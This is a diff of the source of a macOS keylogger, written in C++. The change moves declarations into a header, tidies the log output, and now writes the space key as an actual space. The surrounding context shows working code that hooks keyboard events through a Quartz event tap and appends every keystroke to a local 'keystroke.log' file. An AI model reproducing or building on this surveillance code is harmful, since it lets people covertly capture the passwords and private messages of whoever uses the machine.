@@ -1,14 +1,4 @@
-#include <iostream>
-#include <stdio.h>
-#include <ApplicationServices/ApplicationServices.h>
-#include <Carbon/Carbon.h>
-// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html
-
-using namespace std;
-
-FILE *logfile = NULL;
-CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
-const char *convertKeyCode(int);
+#include "keylogger.h"
 
 int main(int argc, const char *argv[]) {
 
@@ -27,7 +17,7 @@ int main(int argc, const char *argv[]) {
 
     const char *logfileLocation = "./keystroke.log";
     logfile = fopen(logfileLocation, "a");
-    fprintf(logfile, "Keylogging has begun.");
+    fprintf(logfile, "Keylogging has begun.\n");
     fflush(logfile);
 
     cout << "Logging to: " << logfileLocation << endl;
@@ -41,7 +31,7 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
         return event;
     }
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
-    
+
     fprintf(logfile, "%s", convertKeyCode(keyCode));
     fflush(logfile);
 
@@ -117,7 +107,7 @@ const char *convertKeyCode(int keyCode) {
         case 92:  return "9";
         case 36:  return "[return]";
         case 48:  return "[tab]";
-        case 49:  return "[space]";
+        case 49:  return " ";
         case 51:  return "[del]";
         case 53:  return "[esc]";
         case 55:  return "[cmd]";
